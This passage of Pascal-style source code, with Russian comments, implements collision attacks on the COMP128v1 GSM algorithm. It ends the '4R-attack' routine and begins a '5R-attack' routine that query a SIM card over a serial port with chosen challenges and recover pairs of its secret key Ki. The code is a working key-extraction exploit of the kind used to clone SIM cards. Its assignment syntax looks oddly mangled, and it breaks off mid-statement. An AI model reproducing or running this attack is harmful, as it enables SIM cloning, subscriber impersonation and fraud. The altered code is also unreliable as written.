     RandCheck1[AKiPair2]  =  ResBuffer8^[Cur_Uk].Data[0][1][0];
     Rand1[AKiPair2+8]  =  ResBuffer8^[Cur_Uk].Data[0][1][1];
     RandCheck1[AKiPair2+8]  =  ResBuffer8^[Cur_Uk].Data[0][1][1];
     Rand2[AKiPair1]  =  ResBuffer8^[Cur_Uk].Data[1][0][0];
     RandCheck2[AKiPair1]  =  ResBuffer8^[Cur_Uk].Data[1][0][0];
     Rand2[AKiPair1+8]  =  ResBuffer8^[Cur_Uk].Data[1][0][1];
     RandCheck2[AKiPair1+8]  =  ResBuffer8^[Cur_Uk].Data[1][0][1];
     Rand2[AKiPair2]  =  ResBuffer8^[Cur_Uk].Data[1][1][0];
     RandCheck2[AKiPair2]  =  ResBuffer8^[Cur_Uk].Data[1][1][0];
     Rand2[AKiPair2+8]  =  ResBuffer8^[Cur_Uk].Data[1][1][1];
     RandCheck2[AKiPair2+8]  =  ResBuffer8^[Cur_Uk].Data[1][1][1];
     RandCheck1[Pair]  =  0;
     RandCheck2[Pair]  =  0;
     RandCheck1[AKiPair]  =  0;
     RandCheck2[AKiPair]  =  0;
     RandCheck1[AKiPair+8]  =  0;
     RandCheck2[AKiPair+8]  =  0;
     LWrite('->000',1);
     Uk  =  0;
     for CollCounter  =  0 to $FF do begin
      Rand1[Pair+8]  =  CollCounter;
      RandCheck1[Pair+8]  =  CollCounter;
      Rand2[Pair+8]  =  CollCounter;
      RandCheck2[Pair+8]  =  CollCounter;
      Uk  =  Uk+1;
      LWrite(#8#8#8,1);
      S  =  IntToStr(Uk);
      while Length(S)<3 do S  =  '0'+S;
      LWrite(S,1);
      while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes1)<>0) do ;
      if RetraceFile == '' then begin
       Result  =  Gsm(Port,Rand1,SRes1);
      end
      else begin
       Result  =  0;
       if Compare2Rands(RetraceRand,Rand1) == false then begin
        LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
        LWriteln('Expected   ==  '+PrintHexData16(Rand1,true),2);
        LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
        LWriteln('',2);
        A4Rv1  =  -1;
        return;
       end;
      end; 
      if (Result<>0) then begin
       A4Rv1  =  -1;
       return;
      end;
      Uk  =  Uk+1;
      LWrite(#8#8#8,1);
      S  =  IntToStr(Uk);
      while Length(S)<3 do S  =  '0'+S;
      LWrite(S,1);
      while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes2)<>0) do ;
      if RetraceFile == '' then begin
       Result  =  Gsm(Port,Rand2,SRes2);
      end
      else begin
       Result  =  0;
       if Compare2Rands(RetraceRand,Rand2) == false then begin
        LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
        LWriteln('Expected   ==  '+PrintHexData16(Rand2,true),2);
        LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
        LWriteln('',2);
        A4Rv1  =  -1;
        return;
       end;
      end; 
      if (Result<>0) then begin
       A4Rv1  =  -1;
       return;
      end;
      PrS  =  true;
      for J  =  0 to 11 do begin
       if SRes1[J]<>SRes2[J] then begin
        PrS  =  false;
        break;
       end;
      end;
      if PrS == true then begin
       CollB[AllFound]  =  CollCounter;
       AllFound  =  AllFound+1;
       LWriteln(chr($0D),1);
       LWriteln('Found '+IntToStr(AllFound)+' collision (0000'+PrintHexByte(CollB[AllFound-1])+'00).',2);
       {Проверим коллизию}
       LWrite('Checking collision for 4R...',2);
       while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes1)<>0) do ;
       if RetraceFile == '' then begin
        Result  =  Gsm(Port,RandCheck1,SRes1);
       end
       else begin
        Result  =  0;
        if Compare2Rands(RetraceRand,RandCheck1) == false then begin
         LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
         LWriteln('Expected   ==  '+PrintHexData16(RandCheck1,true),2);
         LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
         LWriteln('',2);
         A4Rv1  =  -1;
         return;
        end;
       end; 
       if (Result<>0) then begin
        A4Rv1  =  -1;
        return;
       end;
       while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes2)<>0) do ;
       if RetraceFile == '' then begin
        Result  =  Gsm(Port,RandCheck2,SRes2);
       end
       else begin
        Result  =  0;
        if Compare2Rands(RetraceRand,RandCheck2) == false then begin
         LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
         LWriteln('Expected   ==  '+PrintHexData16(RandCheck2,true),2);
         LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
         LWriteln('',2);
         A4Rv1  =  -1;
         return;
        end;
       end; 
       if (Result<>0) then begin
        A4Rv1  =  -1;
        return;
       end;
       PrS  =  true;
       for J  =  0 to 11 do begin
        if SRes1[J]<>SRes2[J] then begin
         PrS  =  false;
         break;
        end;
       end;
       if PrS then begin
        LWriteln('OK.',2);
       end
       else begin
        LWriteln('Found collision is not 4R collision.',2);
        AllFound  =  AllFound-1;
       end;
       if AllFound<8 then begin
        LWrite('->000',1);
       end;
      end;
      if AllFound == 8 then break;
     end;
     if AllFound == 8 then begin
      {Нашли восемь коллизий}
      LWrite('Calculating KI variation...',2);
      AllKiFound  =  0;
      FillChar(KiVar[1][0],32,0);
      CaseByte  =  ResBuffer8^[Cur_Uk].Nomer;
      {Начинаем поиск с перебора L-байта}
      for LByte  =  0 to $7F do begin
       {Перебираем KI основной пары}
       for CurPair[0]  =  0 to 255 do begin
	ResR1_0[0]  =  Comp128v1_T0[CurPair[0]];
	ResR1_0[1]  =  Comp128v1_T0[2*CurPair[0]];
        for CurPair[1]  =  0 to 255 do begin
  	 PrS  =  true;
         for I  =  0 to 7 do begin
	  ResR1_1[0]  =  Comp128v1_T0[CurPair[1]+2*CollB[I]];
	  ResR1_1[1]  =  Comp128v1_T0[2*CurPair[1]+CollB[I]];
	  case CaseByte of
	   0:ResR2  =  Comp128v1_T1[ResR1_0[0]+2*ResR1_1[0]];
	   1:ResR2  =  Comp128v1_T1[2*ResR1_0[0]+ResR1_1[0]];
	   2:ResR2  =  Comp128v1_T1[ResR1_0[1]+2*ResR1_1[1]];
	   3:ResR2  =  Comp128v1_T1[2*ResR1_0[1]+ResR1_1[1]];
	  end;
	  if ((Pair and $02) shr 1) == 1 then begin
 	   Common  =  Comp128v1_T2[2*ResR2+LByte];
	  end
	  else begin
	   Common  =  Comp128v1_T2[ResR2+2*LByte];
	  end; 
	  if CommonCheck[Common] == 0 then begin
	   PrS  =  false;
	   break;
	  end;
         end;
 	 if PrS then begin
	  PrS  =  true;
	  for I  =  1 to AllKiFound do begin
	   if (KiVar[I][0] == CurPair[0]) and (KiVar[I][1] == CurPair[1]) then begin
	    PrS  =  false;
	    break;
	   end;
	  end;
	  if PrS then begin
           AllKiFound  =  AllKiFound+1;
           KiVar[AllKiFound]  =  CurPair;
	  end; 
	 end;
        end;
       end;
      end;
      LWriteln(IntToStr(AllKiFound)+' found.',2);
      {Проверяем полученный список вариантов Ki}
      if AllKiFound>0 then begin
       for I  =  1 to 16 do KiVarGood[I]  =  0;
       PrCollGood  =  false;
       for CurKiVar  =  1 to AllKiFound do begin
        LWrite('Checking KI pair '+PrintHexPair(KiVar[CurKiVar],false)+'...',2);
        PrUncol  =  false;
        for I  =  0 to 768 do begin
         if (KiVar[CurKiVar,0] == UncolPair_2R_v1[I,0]) and (KiVar[CurKiVar,1] == UncolPair_2R_v1[I,1]) then begin 
          PrUncol  =  true;
          break;
         end;
         if (UncolPair_2R_v1[I,0]>KiVar[CurKiVar,0]) or 
          ((UncolPair_2R_v1[I,0] == KiVar[CurKiVar,0]) and (UncolPair_2R_v1[I,1]>KiVar[CurKiVar,1])) then begin
          break; 
         end; 
        end;
        if PrUncol == true then begin
         KiVarGood[CurKiVar]  =  1;
         LWriteln('Uncollision.',2);
        end
        else begin
         {Ищем 2R-коллизию для данной пары KI}
         FillChar(IndexCollBuffer^[0][0],4*256*256,$FF);
         SC_Uk  =  0;
         for I  =  0 to $FF do begin
	  R0_after_R1[I][0]  =  Comp128v1_T0[KiVar[CurKiVar][0]+2*I];
	  R0_after_R1[I][1]  =  Comp128v1_T0[2*KiVar[CurKiVar][0]+I];
	 end; 
         for I  =  0 to $FF do begin
	  R8_after_R1[I][0]  =  Comp128v1_T0[KiVar[CurKiVar][1]+2*I];
	  R8_after_R1[I][1]  =  Comp128v1_T0[2*KiVar[CurKiVar][1]+I];
	 end; 
         for CurPair[0]  =  0 to $FF do begin
          for CurPair[1]  =  0 to $FF do begin
           PrS  =  false;
	   PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
	   PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
           Move(PairRes[0],EmulRes[0],2);
	   PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
	   PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
           Move(PairRes[0],EmulRes[2],2);
           if IndexCollBuffer^[EmulRes[0]][EmulRes[1]] == -1 then begin
            CollBuffer^[SC_Uk].B2  =  EmulRes[2];
            CollBuffer^[SC_Uk].B3  =  EmulRes[3];
            CollBuffer^[SC_Uk].Pair  =  CurPair;
            CollBuffer^[SC_Uk].Next  =  -1;
            IndexCollBuffer^[EmulRes[0]][EmulRes[1]]  =  SC_Uk;
            SC_Uk  =  SC_Uk+1;
           end
           else begin
            NextColl  =  IndexCollBuffer^[EmulRes[0]][EmulRes[1]];
            PrevColl  =  -1;
            PrS  =  false;
            while NextColl<>-1 do begin
             if (CollBuffer^[NextColl].B2 == EmulRes[2]) and (CollBuffer^[NextColl].B3 == EmulRes[3]) then begin
              FoundPair1  =  CollBuffer^[NextColl].Pair;
              FoundPair2  =  CurPair;
      	      PrS  =  true;
	      break;
	     end
	     else begin
              PrevColl  =  NextColl;
              NextColl  =  CollBuffer^[NextColl].Next;
	     end;
            end;
	    if NextColl == -1 then begin
	     CollBuffer^[SC_Uk].B2  =  EmulRes[2];
	     CollBuffer^[SC_Uk].B3  =  EmulRes[3];
             CollBuffer^[SC_Uk].Pair  =  CurPair;
             CollBuffer^[SC_Uk].Next  =  -1;
             CollBuffer^[PrevColl].Next  =  SC_Uk;
             SC_Uk  =  SC_Uk+1;
            end;
	   end;
	   if PrS then break;
	  end;
	  if PrS then break;
	 end;    
	 {Проверяем пару по найденной коллизии}
         FillChar(CRand1[0],16,$0);
         FillChar(CRand2[0],16,$0);
 	 CRand1[Pair]  =  FoundPair1[0];
	 CRand1[Pair+8]  =  FoundPair1[1]; 
	 CRand2[Pair]  =  FoundPair2[0];
	 CRand2[Pair+8]  =  FoundPair2[1]; 
         while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes1)<>0) do ;
         if RetraceFile == '' then begin
          Result  =  Gsm(Port,CRand1,CSRes1);
         end
         else begin
          Result  =  0;
          if Compare2Rands(RetraceRand,CRand1) == false then begin
           LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
           LWriteln('Expected   ==  '+PrintHexData16(CRand1,true),2);
           LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
           LWriteln('',2);
           A4Rv1  =  -1;
           return;
          end;
         end; 
         if (Result<>0) then begin
          A4Rv1  =  -1;
          return;
         end;
         while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes2)<>0) do ;
         if RetraceFile == '' then begin
          Result  =  Gsm(Port,CRand2,CSRes2);
         end
         else begin
          Result  =  0;
          if Compare2Rands(RetraceRand,CRand2) == false then begin
           LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
           LWriteln('Expected   ==  '+PrintHexData16(CRand2,true),2);
           LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
           LWriteln('',2);
           A4Rv1  =  -1;
           return;
          end;
         end; 
         if (Result<>0) then begin
          A4Rv1  =  -1;
          return;
         end;
         PrS  =  true;
         for J  =  0 to 11 do begin
          if CSRes1[J]<>CSRes2[J] then begin
     	   PrS  =  false;
   	   break;
	  end;
         end;
	 if PrS then begin
	  KiVarGood[CurKiVar]  =  2;
	  PrCollGood  =  true;
	  LWriteln('OK.',2);
	 end
	 else begin
	  LWriteln('Wrong.',2);
	 end; 
        end;
       end; 
       if PrCollGood then begin
        for I  =  1 to 16 do begin
         if KiVarGood[I] == 1 then KiVarGood[I]  =  0;
        end;
       end;
       CurGoodKi  =  0;
       for I  =  1 to 16 do begin
        if KiVarGood[I]<>0 then begin
         CurGoodKi  =  CurGoodKi+1;
         GoodKi[CurGoodKi]  =  KiVar[I];
        end;
       end;
       {Посмотрим, сколько пар KI мы нашли}
       if CurGoodKi == 0 then begin
        LWriteln('Cannot find good KI pair variants. Continue 3R-attack with other two pairs.',2);
       end;
       if CurGoodKi == 1 then begin
        LWriteln('Found KI pair  ==  '+PrintHexPair(GoodKi[1],false),2);
        KiPair  =  GoodKi[1];
        Pr4RAttack  =  true;
       end;
       if CurGoodKi>1 then begin
        LWriteln(CharsetUpdate('НЕДОПИСАНО!!! НЕСКОЛЬКО УСПЕШНЫХ ВАРИАНТОВ!!!'),2);
        return;
       end;
      end
      else begin
       LWriteln('Cannot find KI pair variants. Continue 3R-attack with other two pairs.',2);
      end; 
     end
     else LWriteln(chr($0D),1);
    end; 
    if Pr4RAttack == true then break;
    Cur_Uk  =  Cur_Uk+1;
    if Cur_Uk>(Res_Uk-1) then begin
     if PrStep == false then begin
      PrStep  =  true;
      Cur_Uk  =  0;
     end;
    end;
   end;      
   {Выведем результаты}
   if Pr4RAttack == true then begin
    LWriteln('-------------------------------',2);
    LWriteln('4R-attack OK. KI pair  ==  '+PrintHexPair(KiPair,true)+'. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end
   else begin
    LWriteln('-------------------------------',2);
    LWriteln('4R-attack FAILED! Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
    Res  =  1;
   end;
   FreeMem(DataBuffer,SizeOf(TA4Rv1_Data));
   FreeMem(IndexBuffer,SizeOf(TA4Rv1_Index));
   FreeMem(CollBuffer,SizeOf(TA4Rv1_Coll));
   FreeMem(IndexCollBuffer,SizeOf(TA4Rv1_CollIndex));
   FreeMem(ResBuffer1,SizeOf(TA4Rv1_Res));
   FreeMem(ResBuffer2,SizeOf(TA4Rv1_Res));
   FreeMem(ResBuffer8,SizeOf(TA4Rv1_Res8));
   LWriteln('',2);
   A4Rv1  =  Res;
  end;

 {Функция проведения 5R-атаки на алгоритм Comp128v1}
 function A5Rv1(var Port:TBlockSerial;Pair:byte;CData:TData8;var KIPair:TPair):Longint;
  const
   SearchPair8Table1:array[0..5] of TPair == (($1C,$0A),($21,$32),($06,$34),($2C,$09),($0A,$28),($06,$0F));
   SearchPair8Table2:array[0..5] of TPair == (($37,$20),($20,$2C),($22,$0B),($0F,$0C),($00,$11),($02,$09));
  type
   TSearchRec == record
    B0,B1,B2:byte;
    BD:byte;
   end;
   TSearch == array[0..3] of TSearchRec;
  var
   Res:Longint;
   Pr5RAttack:boolean;
   DataBuffer:PA5Rv1_Data;
   IndexBuffer:PA5Rv1_Index;
   ResBuffer1,ResBuffer2:PA5Rv1_Res;
   ResBuffer81,ResBuffer82:PA5Rv1_Res8;
   ResBuffer:PA5Rv1_Res16;
   CollBuffer:PA5Rv1_Coll;
   IndexCollBuffer:PA5Rv1_CollIndex;
   ResCheck:array[0..3,0..63,0..63] of byte;
   ResCheck16:array[0..3,0..31,0..31] of byte;
   Concat8:array[0..3] of TPair;
   Concat16:array[0..3] of TPair;
   FoundPair1,FoundPair2:TPair;
   SD_Uk,Res1_Uk,Res2_Uk,SC_Uk:Longint;
   Cur_Uk:Longint;
   Res81_Uk,Res82_Uk:Longint;
   Res_Uk:Longint;
   I,J,K:Longint;
   R0_after_R1,R8_after_R1:array[0..255] of TPair;
   Rand1,Rand2:TData16;
   RetraceRand:TData16;
   AKiPair:shortint;
   PairRes:TPair;
   CurPair:TPair;
   CPair1,CPair2:TPair;
   Search:TSearch;
   SearchPairArray:array[0..3] of byte;
   CalcByte:byte;
   Prev,Next:Longint;
   PrevColl,NextColl:Longint;
   WorkData:array[0..1] of TPair;
   WorkRes:array[0..1] of TData4;
   P1,P2:Longint;
   PN:byte;
   AllFound:Longint;
   CommonUk:byte;
   PrStep:boolean;
   CommonCheck:array[0..$3F] of Longint;
   CollCounter:Longint;
   S:String[3];
   Uk:Longint;   
   SRes1,SRes2:TData12;
   Result:Longint;
   PrS:boolean;   
   CollB:array[0..31] of Longint;
   AllKiFound:Longint;   
   KiVar:array[1..16] of TPair;
   L12Byte,L3Byte:byte;
   ResR1_0:TPair;
   ResR1_1:TPair;
   ResR2:byte;
   CaseByte:byte;
   CaseBit0,CaseBit1:Longint;
   CRand1,CRand2:TData16;
   CSRes1,CSRes2:TData12;
   CurKiVar:Longint;
   PrUncol:boolean;
   KiVarGood:array[1..16] of byte;
   PrCollGood:boolean;
   GoodKi:array[1..16] of TPair;
   CurGoodKi:Longint;
   EmulRes:TData4;
   PreCommon,Common:byte;
   
  begin
   Res  =  0;
   FillChar(KIPair[0],2,$0);
   LWriteln('-------------------------------',2);
   LWriteln('Starting 5R-attack on pair '+IntToStr(Pair)+'...',2);
   LWriteln('-------------------------------',2);
   DataBuffer  =  nil;
   GetMem(DataBuffer,SizeOf(TA5Rv1_Data));
   if DataBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for DataBuffer!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   IndexBuffer  =  nil;
   GetMem(IndexBuffer,SizeOf(TA5Rv1_Index));
   if IndexBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexBuffer!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   CollBuffer  =  nil;
   GetMem(CollBuffer,SizeOf(TA5Rv1_Coll));
   if CollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for CollBuffer!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   IndexCollBuffer  =  nil;
   GetMem(IndexCollBuffer,SizeOf(TA5Rv1_CollIndex));
   if IndexCollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexCollBuffer!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   ResBuffer1  =  nil;
   GetMem(ResBuffer1,SizeOf(TA5Rv1_Res));
   if ResBuffer1 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer1!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   ResBuffer2  =  nil;
   GetMem(ResBuffer2,SizeOf(TA5Rv1_Res));
   if ResBuffer2 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer2!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   ResBuffer81  =  nil;
   GetMem(ResBuffer81,SizeOf(TA5Rv1_Res8));
   if ResBuffer81 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer81!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   ResBuffer82  =  nil;
   GetMem(ResBuffer82,SizeOf(TA5Rv1_Res8));
   if ResBuffer82 == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer82!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   ResBuffer  =  nil;
   GetMem(ResBuffer,SizeOf(TA5Rv1_Res16));
   if ResBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for ResBuffer!',2);
    LWriteln('',2);
    A5Rv1  =  -1;
    return;
   end;
   {Исход атаки}
   Pr5RAttack  =  false;
   {Ищем четверки, которые после 2-х раундов отличаются одним байтом}
   LWriteln('Calculating data for 5R-attack...',2);
   {Первая пара}
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res1_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CData[0]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CData[0]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CData[4]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CData[4]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer1^[Res1_Uk].Data  =  WorkData;
	 ResBuffer1^[Res1_Uk].Res  =  WorkRes;
	 ResBuffer1^[Res1_Uk].Nomer  =  CalcByte;
	 Res1_Uk  =  Res1_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res1_Uk)+' possible 4-bytes pair groups (1).',2);
   {Вторая пара}
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res2_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CData[2]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CData[2]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CData[6]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CData[6]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
